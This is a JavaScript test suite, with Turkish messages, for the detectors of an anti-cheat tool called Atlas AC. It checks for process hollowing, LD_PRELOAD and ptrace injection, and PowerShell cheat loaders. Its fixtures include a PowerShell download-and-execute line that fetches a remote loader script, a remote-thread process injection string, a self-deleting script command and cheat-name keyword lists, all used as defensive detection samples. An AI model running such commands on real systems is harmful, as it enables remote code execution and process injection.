/**
 * Atlas AC - New Engines Test Suite
 * Tests: processHollowingDetector, ldPreloadInjectionDetector, powerShellScriptForensics
 * And expanded CheatKnowledgeBase coverage
 */

const assert = require('assert');

console.log('====================================================');
console.log('   ATLAS AC - YENI MOTORLAR TEST SUITE            ');
console.log('====================================================\n');

let totalTests = 0;
let passedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    const result = fn();
    if (result && typeof result.then === 'function') {
      result.then(() => {
        console.log(`[PASS] ${name}`);
        passedTests++;
      }).catch(err => {
        console.error(`[FAIL] ${name}:`, err.message);
      });
    } else {
      console.log(`[PASS] ${name}`);
      passedTests++;
    }
  } catch (err) {
    console.error(`[FAIL] ${name}:`, err.message);
  }
}

// ─── processHollowingDetector Tests ─────────────────────────────────────────
const hollowDetector = require('../src/engine/processHollowingDetector');

runTest('processHollowingDetector modülü yüklenmeli', () => {
  assert(hollowDetector, 'Modül yüklenemedi');
  assert(typeof hollowDetector.scanProcessHollowing === 'function', 'scanProcessHollowing fonksiyonu eksik');
});

runTest('Linux: /dev/shm sahte hile segmenti tespit mantığı', () => {
  const shmNames = ['vape_ipc', 'drip_shared', 'cheat_mem', 'inject_bridge'];
  const cheatKeywords = ['vape', 'drip', 'slinky', 'cheat', 'inject'];
  const detected = shmNames.filter(n => cheatKeywords.some(k => n.includes(k)));
  assert(detected.length >= 3, `En az 3 SHM yakalanmalı, bulunan: ${detected.length}`);
});

runTest('Linux: process_ghosting - silinen exe tespiti mantığı', () => {
  const mapLine = '7f1234000000-7f1234100000 r-xp 00000000 fd:01 0   /tmp/libcheat.so (deleted)';
  assert(mapLine.includes('(deleted)') && mapLine.includes('r-xp'), 'Silinmiş exec bölge tespit edilmeli');
});

// ─── ldPreloadInjectionDetector Tests ────────────────────────────────────────
const ldDetector = require('../src/engine/ldPreloadInjectionDetector');

runTest('ldPreloadInjectionDetector modülü yüklenmeli', () => {
  assert(ldDetector, 'Modül yüklenemedi');
  assert(typeof ldDetector.scanLdPreloadAndPtrace === 'function', 'scanLdPreloadAndPtrace fonksiyonu eksik');
});

runTest('Linux: LD_PRELOAD parse mantığı (/tmp/ yükleme tespiti)', () => {
  const fakeEnviron = 'HOME=/home/user\x00LD_PRELOAD=/tmp/inject.so\x00TERM=xterm\x00';
  const vars = fakeEnviron.split('\x00').filter(Boolean);
  const ldPreload = vars.find(v => v.startsWith('LD_PRELOAD='));
  assert(ldPreload, 'LD_PRELOAD bulunmalı');
  const value = ldPreload.split('=').slice(1).join('=');
  assert(value.startsWith('/tmp/') || value.startsWith('/dev/shm/'), '/tmp veya /dev/shm üzerinde yükleniyor');
});

runTest('Linux: ptrace TracerPid > 0 ise injection tespiti', () => {
  const status = 'Name:\tjava\nPid:\t12345\nTracerPid:\t9876\nVmRSS:\t512000 kB\n';
  const match = status.match(/TracerPid:\s*(\d+)/);
  assert(match && parseInt(match[1]) > 0, 'ptrace injection tespit edilmeli');
});

runTest('Linux: unlinked memory-mapped executable tespiti', () => {
  const mapsLines = [
    '7f00-7f10 r-xp 0 fd:01 0  /lib/x86_64-linux-gnu/libc.so.6',
    '7f10-7f20 r-xp 0 fd:01 0  /tmp/libhook.so (deleted)',
    '7f20-7f30 rw-p 0 00:00 0  [anon]'
  ];
  const deletedExec = mapsLines.filter(l => l.includes('(deleted)') && /r.xp/.test(l));
  assert(deletedExec.length >= 1, 'Silinmiş exec harita satırı bulunmalı');
});

// ─── powerShellScriptForensics Tests ─────────────────────────────────────────
const psForensics = require('../src/engine/powerShellScriptForensics');

runTest('powerShellScriptForensics modülü yüklenmeli', () => {
  assert(psForensics, 'Modül yüklenemedi');
  assert(typeof psForensics.scanPowerShellForensics === 'function', 'scanPowerShellForensics fonksiyonu eksik');
});

runTest('PowerShell: VirtualAllocEx + WriteProcessMemory injection tespiti', () => {
  const script = 'VirtualAllocEx($h, 0, $size, 0x3000, 0x40); WriteProcessMemory($h, $addr, $buf); CreateRemoteThread($h, 0, 0, $addr)';
  const tokens = ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'];
  const matched = tokens.filter(t => script.includes(t));
  assert(matched.length >= 3, `3 enjeksiyon token yakalanmalı, bulunan: ${matched.length}`);
});

runTest('PowerShell: IEX + hile URL yükleyici tespiti', () => {
  const line = "IEX (New-Object Net.WebClient).DownloadString('https://vape.gg/loader.ps1')";
  const isLoader = /IEX|Invoke-Expression/i.test(line) && /vape|drip|slinky|cheat/i.test(line);
  assert(isLoader, 'IEX cheat loader yakalanmalı');
});

runTest('PowerShell: Kendini silen script (anti-forensics) tespiti', () => {
  const script = "Remove-Item -Path $MyInvocation.MyCommand.Path -Force\ndel /f /q C:\\Users\\player\\vape.jar";
  const hasSelfDestruct = /Remove-Item.*MyInvocation|del.*\/f.*\/q/i.test(script);
  assert(hasSelfDestruct, 'Kendini silen script yakalanmalı');
});

// ─── CheatKnowledgeBase Expanded Coverage ────────────────────────────────────
const kb = require('../src/engine/cheatKnowledgeBase');

runTest('CheatKnowledgeBase: 30+ tespit türü içermeli', () => {
  const count = Object.keys(kb.knowledge).length;
  assert(count >= 30, `30+ girish olmali, bulunan: ${count}`);
});

runTest('CheatKnowledgeBase: BAM_CHEAT_RECORD Türkçe rehber', () => {
  const g = kb.getExplanation({ type: 'BAM_CHEAT_RECORD' }, 'tr');
  assert(g && g.howItWorks && g.adminAction, 'BAM rehberi eksik');
  assert(g.adminAction.includes('BAN'), 'BAN aksiyonu içermeli');
});

runTest('CheatKnowledgeBase: DEFENDER_CHEAT_THREAT_DETECTED rehberi', () => {
  const g = kb.getExplanation({ type: 'DEFENDER_CHEAT_THREAT_DETECTED' }, 'tr');
  assert(g && g.tacticName, 'Defender rehberi eksik');
});

runTest('CheatKnowledgeBase: ACTIVE_CHEAT_PROCESS_RUNNING rehberi', () => {
  const g = kb.getExplanation({ type: 'ACTIVE_CHEAT_PROCESS_RUNNING' }, 'tr');
  assert(g && g.howItWorks, 'Aktif süreç rehberi eksik');
});

runTest('CheatKnowledgeBase: NTFS_HIDDEN_ADS_PAYLOAD rehberi', () => {
  const g = kb.getExplanation({ type: 'NTFS_HIDDEN_ADS_PAYLOAD' }, 'tr');
  assert(g && g.howItWorks, 'ADS rehberi eksik');
});

runTest('CheatKnowledgeBase: JVM_AGENT_ATTACHED rehberi', () => {
  const g = kb.getExplanation({ type: 'JVM_AGENT_ATTACHED' }, 'tr');
  assert(g && g.adminAction, 'JVM Agent rehberi eksik');
});

runTest('CheatKnowledgeBase: PROCESS_GHOSTING_DELETED_MODULE rehberi', () => {
  const g = kb.getExplanation({ type: 'PROCESS_GHOSTING_DELETED_MODULE' }, 'tr');
  assert(g, 'Process Ghosting rehberi eksik');
});

runTest('CheatKnowledgeBase: USERASSIST_CHEAT_RECORD rehberi', () => {
  const g = kb.getExplanation({ type: 'USERASSIST_CHEAT_RECORD' }, 'tr');
  assert(g && g.howItWorks, 'UserAssist rehberi eksik');
});

runTest('CheatKnowledgeBase: RECYCLE_BIN_DELETED_CHEAT rehberi', () => {
  const g = kb.getExplanation({ type: 'RECYCLE_BIN_DELETED_CHEAT' }, 'tr');
  assert(g && g.adminAction, 'Recycle Bin rehberi eksik');
});

runTest('CheatKnowledgeBase: SRUM_APPLICATION_EXECUTION_RECORD rehberi', () => {
  const g = kb.getExplanation({ type: 'SRUM_APPLICATION_EXECUTION_RECORD' }, 'tr');
  assert(g, 'SRUM rehberi eksik');
});

// Summary
console.log(`\n====================================================`);
console.log(`   SONUC: ${passedTests} / ${totalTests} TEST BASARILI!`);
console.log(`====================================================\n`);

module.exports = { totalTests, passedTests };
